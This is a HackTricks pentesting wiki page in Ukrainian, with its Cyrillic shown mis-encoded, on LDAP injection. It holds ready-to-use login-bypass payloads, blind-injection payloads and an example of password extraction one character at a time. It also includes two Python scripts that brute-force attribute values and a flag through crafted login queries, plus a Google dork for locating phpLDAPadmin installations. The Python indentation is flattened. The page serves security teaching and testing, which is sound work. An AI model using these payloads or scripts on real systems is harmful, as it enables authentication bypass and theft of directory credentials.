# LDAP Injection

## –í–Ω–µ–¥—Ä–µ–Ω–Ω—è LDAP

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é –≤ —Ä–µ–∫–ª–∞–º—ñ –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF** –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

–Ø–∫—â–æ –≤–∏ –∑–∞—Ü—ñ–∫–∞–≤–ª–µ–Ω—ñ –≤ **–∫–∞—Ä'—î—Ä—ñ —Ö–∞–∫–µ—Ä–∞** —Ç–∞ —Ö–æ—á–µ—Ç–µ –≤–∑–ª–∞–º–∞—Ç–∏ –Ω–µ–≤–∑–ª–∞–º–Ω–µ - **–º–∏ —à—É–∫–∞—î–º–æ —Å–ø—ñ–≤—Ä–æ–±—ñ—Ç–Ω–∏–∫—ñ–≤!** (_–≤–∏–º–∞–≥–∞—î—Ç—å—Å—è –≤—ñ–ª—å–Ω–µ –≤–æ–ª–æ–¥—ñ–Ω–Ω—è –ø–æ–ª—å—Å—å–∫–æ—é –º–æ–≤–æ—é, —è–∫ –ø–∏—Å—å–º–æ–≤–æ, —Ç–∞–∫ —ñ —É—Å–Ω–æ_).

{% embed url="https://www.stmcyber.com/careers" %}

## –í–Ω–µ–¥—Ä–µ–Ω–Ω—è LDAP

### **LDAP**

**–Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —â–æ —Ç–∞–∫–µ LDAP, –ø–µ—Ä–µ–π–¥—ñ—Ç—å –Ω–∞—Å—Ç—É–ø–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É:**

{% content-ref url="../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

**–í–Ω–µ–¥—Ä–µ–Ω–Ω—è LDAP** - —Ü–µ –∞—Ç–∞–∫–∞ –Ω–∞ –≤–µ–±-–¥–æ–¥–∞—Ç–∫–∏, —è–∫—ñ —Å—Ç–≤–æ—Ä—é—é—Ç—å –æ–ø–µ—Ä–∞—Ç–æ—Ä–∏ LDAP –∑ –≤–≤–µ–¥–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –¶–µ –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è, –∫–æ–ª–∏ –¥–æ–¥–∞—Ç–æ–∫ **–Ω–µ –≤—ñ–¥—Ñ—ñ–ª—å—Ç—Ä–æ–≤—É—î –Ω–∞–ª–µ–∂–Ω–∏–º —á–∏–Ω–æ–º** –≤–≤–µ–¥–µ–Ω–Ω—è, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º **–º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞–º–∏ LDAP** —á–µ—Ä–µ–∑ –ª–æ–∫–∞–ª—å–Ω–∏–π –ø—Ä–æ–∫—Å—ñ, —â–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø—É –∞–±–æ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è –¥–∞–Ω–∏–º–∏.

{% file src="../.gitbook/assets/en-blackhat-europe-2008-ldap-injection-blind-ldap-injection.pdf" %}

**–§—ñ–ª—å—Ç—Ä** = ( filtercomp )\
**Filtercomp** = and / or / not / item\
**And** = & filterlist\
**Or** = |filterlist\
**Not** = ! filter\
**Filterlist** = 1\*filter\
**Item**= simple / present / substring\
**Simple** = attr filtertype assertionvalue\
**Filtertype** = _'=' / '\~=' / '>=' / '<='_\
**Present** = attr = \*\
**Substring** = attr ‚Äù=‚Äù \[initial] \* \[final]\
**Initial** = assertionvalue\
**Final** = assertionvalue\
**(&)** = Absolute TRUE\
**(|)** = Absolute FALSE

–ù–∞–ø—Ä–∏–∫–ª–∞–¥:\
`(&(!(objectClass=Impresoras))(uid=s*))`\
`(&(objectClass=user)(uid=*))`

–í–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö, —è–∫–∞ –º–æ–∂–µ –º—ñ—Å—Ç–∏—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é —Ä—ñ–∑–Ω–∏—Ö —Ç–∏–ø—ñ–≤.

**OpenLDAP**: –Ø–∫—â–æ –Ω–∞–¥—Ö–æ–¥—è—Ç—å 2 —Ñ—ñ–ª—å—Ç—Ä–∏, –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –ª–∏—à–µ –ø–µ—Ä—à–∏–π.\
**ADAM –∞–±–æ Microsoft LDS**: –ó 2 —Ñ—ñ–ª—å—Ç—Ä–∞–º–∏ –≤–æ–Ω–∏ –≤–∏–¥–∞—é—Ç—å –ø–æ–º–∏–ª–∫—É.\
**SunOne Directory Server 5.0**: –í–∏–∫–æ–Ω—É—î –æ–±–∏–¥–≤–∞ —Ñ—ñ–ª—å—Ç—Ä–∏.

**–î—É–∂–µ –≤–∞–∂–ª–∏–≤–æ –≤—ñ–¥–ø—Ä–∞–≤–ª—è—Ç–∏ —Ñ—ñ–ª—å—Ç—Ä –∑ –ø—Ä–∞–≤–∏–ª—å–Ω–∏–º —Å–∏–Ω—Ç–∞–∫—Å–∏—Å–æ–º, —ñ–Ω–∞–∫—à–µ –±—É–¥–µ –≤–∏–∫–∏–Ω—É—Ç–∞ –ø–æ–º–∏–ª–∫–∞. –ö—Ä–∞—â–µ –≤—ñ–¥–ø—Ä–∞–≤–ª—è—Ç–∏ –ª–∏—à–µ 1 —Ñ—ñ–ª—å—Ç—Ä.**

–§—ñ–ª—å—Ç—Ä –ø–æ–≤–∏–Ω–µ–Ω –ø–æ—á–∏–Ω–∞—Ç–∏—Å—è –∑: `&` –∞–±–æ `|`\
–ü—Ä–∏–∫–ª–∞–¥: `(&(directory=val1)(folder=public))`

`(&(objectClass=VALUE1)(type=Epson*))`\
`VALUE1 = *)(ObjectClass=*))(&(objectClass=void`

–ü–æ—Ç—ñ–º: `(&(objectClass=`**`*)(ObjectClass=*))`** –±—É–¥–µ –ø–µ—Ä—à–∏–º —Ñ—ñ–ª—å—Ç—Ä–æ–º (–≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–º).

### –£—Ö–∏–ª–µ–Ω–Ω—è –≤—ñ–¥ –≤—Ö–æ–¥—É

LDAP –ø—ñ–¥—Ç—Ä–∏–º—É—î –∫—ñ–ª—å–∫–∞ —Ñ–æ—Ä–º–∞—Ç—ñ–≤ –¥–ª—è –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—è: clear, md5, smd5, sh1, sha, crypt. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, –º–æ–∂–ª–∏–≤–æ, —â–æ –Ω–µ–∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Ç–æ–≥–æ, —â–æ –≤–∏ –≤—Å—Ç–∞–≤–ª—è—î—Ç–µ —É –ø–∞—Ä–æ–ª—å, –≤—ñ–Ω –±—É–¥–µ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π.

```bash
user=*
password=*
--> (&(user=*)(password=*))
# The asterisks are great in LDAPi
```

```bash
user=*)(&
password=*)(&
--> (&(user=*)(&)(password=*)(&))
```

```bash
user=*)(|(&
pass=pwd)
--> (&(user=*)(|(&)(pass=pwd))
```

```bash
user=*)(|(password=*
password=test)
--> (&(user=*)(|(password=*)(password=test))
```

```bash
user=*))%00
pass=any
--> (&(user=*))%00 --> Nothing more is executed
```

```bash
user=admin)(&)
password=pwd
--> (&(user=admin)(&))(password=pwd) #Can through an error
```

```bash
username = admin)(!(&(|
pass = any))
--> (&(uid= admin)(!(& (|) (webpassword=any)))) ‚Äî> As (|) is FALSE then the user is admin and the password check is True.
```

```bash
username=*
password=*)(&
--> (&(user=*)(password=*)(&))
```

```bash
username=admin))(|(|
password=any
--> (&(uid=admin)) (| (|) (webpassword=any))
```

#### –°–ø–∏—Å–∫–∏

* [LDAP\_FUZZ](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP\_FUZZ.txt)
* [–ê—Ç—Ä–∏–±—É—Ç–∏ LDAP](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP\_attributes.txt)
* [–ê—Ç—Ä–∏–±—É—Ç–∏ LDAP PosixAccount](https://tldp.org/HOWTO/archived/LDAP-Implementation-HOWTO/schemas.html)

### –°–ª—ñ–ø–∞ LDAP —ñ–Ω'—î–∫—Ü—ñ—è

–í–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–∏–º—É—Å–∏—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ False –∞–±–æ True, —â–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –ø–æ–≤–µ—Ä—Ç–∞—é—Ç—å—Å—è —è–∫—ñ-–Ω–µ–±—É–¥—å –¥–∞–Ω—ñ —Ç–∞ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∏—Ç–∏ –º–æ–∂–ª–∏–≤—É —Å–ª—ñ–ø—É LDAP —ñ–Ω'—î–∫—Ü—ñ—é:

```bash
#This will result on True, so some information will be shown
Payload: *)(objectClass=*))(&objectClass=void
Final query: (&(objectClass= *)(objectClass=*))(&objectClass=void )(type=Pepi*))
```

```bash
#This will result on True, so no information will be returned or shown
Payload: void)(objectClass=void))(&objectClass=void
Final query: (&(objectClass= void)(objectClass=void))(&objectClass=void )(type=Pepi*))
```

#### –í–∏—Ç—è–≥–Ω—É—Ç–∏ –¥–∞–Ω—ñ

–í–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–±–∏—Ä–∞—Ç–∏ —Å–∏–º–≤–æ–ª–∏ ASCII: –ª—ñ—Ç–µ—Ä–∏, —Ü–∏—Ñ—Ä–∏ —Ç–∞ —Å–∏–º–≤–æ–ª–∏:

```bash
(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=B*))   : KO
...
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MA*))  : KO
(&(sn=administrator)(password=MB*))  : KO
...
```

### –°—Ü–µ–Ω–∞—Ä—ñ—ó

#### **–í–∏—è–≤–ª–µ–Ω–Ω—è –¥—ñ–π—Å–Ω–∏—Ö –ø–æ–ª—ñ–≤ LDAP**

–û–±'—î–∫—Ç–∏ LDAP **–∑–∞–∑–≤–∏—á–∞–π –º—ñ—Å—Ç—è—Ç—å –∫—ñ–ª—å–∫–∞ –∞—Ç—Ä–∏–±—É—Ç—ñ–≤**, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è **–∑–±–µ—Ä–µ–∂–µ–Ω–Ω—è —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó**. –í–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ **–ø–µ—Ä–µ–±—Ä–∞—Ç–∏ —ó—Ö –≤—Å—ñ, —â–æ–± –≤–∏–¥–æ–±—É—Ç–∏ —Ü—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é**. –í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Å–ø–∏—Å–æ–∫ [**—Ç–∏–ø–æ–≤–∏—Ö –∞—Ç—Ä–∏–±—É—Ç—ñ–≤ LDAP —Ç—É—Ç**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP\_attributes.txt).

```python
#!/usr/bin/python3
import requests
import string
from time import sleep
import sys

proxy = { "http": "localhost:8080" }
url = "http://10.10.10.10/login.php"
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

attributes = ["c", "cn", "co", "commonName", "dc", "facsimileTelephoneNumber", "givenName", "gn", "homePhone", "id", "jpegPhoto", "l", "mail", "mobile", "name", "o", "objectClass", "ou", "owner", "pager", "password", "sn", "st", "surname", "uid", "username", "userPassword",]

for attribute in attributes: #Extract all attributes
value = ""
finish = False
while not finish:
for char in alphabet: #In each possition test each possible printable char
query = f"*)({attribute}={value}{char}*"
data = {'login':query, 'password':'bla'}
r = requests.post(url, data=data, proxies=proxy)
sys.stdout.write(f"\r{attribute}: {value}{char}")
#sleep(0.5) #Avoid brute-force bans
if "Cannot login" in r.text:
value += str(char)
break

if char == alphabet[-1]: #If last of all the chars, then, no more chars in the value
finish = True
print()
```

#### **–°–ø–µ—Ü—ñ–∞–ª—å–Ω–∞ —Å–ª—ñ–ø–∞ LDAP —ñ–Ω'—î–∫—Ü—ñ—è (–±–µ–∑ "\*")**

```python
#!/usr/bin/python3

import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
print("[i] Looking for number " + str(i))
for char in alphabet:
r = requests.get("http://ctf.web??action=dir&search=admin*)(password=" + flag + char)
if ("TRUE CONDITION" in r.text):
flag += char
print("[+] Flag: " + flag)
break
```

### Google Dorks

### Google Dorks

```bash
intitle:"phpLDAPadmin" inurl:cmd.php
```

### –î–æ–¥–∞—Ç–∫–æ–≤—ñ Payloads

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection" %}

<figure><img src="https://github.com/carlospolop/hacktricks/blob/ua/.gitbook/assets/image%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1).png" alt=""><figcaption></figcaption></figure>

–Ø–∫—â–æ –≤–∞—Å —Ü—ñ–∫–∞–≤–∏—Ç—å **–∫–∞—Ä'—î—Ä–∞ —Ö–∞–∫–µ—Ä–∞** —ñ –≤–∑–ª–∞–º–∞—Ç–∏ –Ω–µ–≤–∑–ª–∞–º–Ω–µ - **–º–∏ —à—É–∫–∞—î–º–æ —Å–ø—ñ–≤—Ä–æ–±—ñ—Ç–Ω–∏–∫—ñ–≤!** (_–≤–∏–º–∞–≥–∞—î—Ç—å—Å—è –≤—ñ–ª—å–Ω–µ –ø–∏—Å—å–º–æ —Ç–∞ –º–æ–≤–ª–µ–Ω–Ω—è –ø–æ–ª—å—Å—å–∫–æ—é_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF** –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks swag**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>
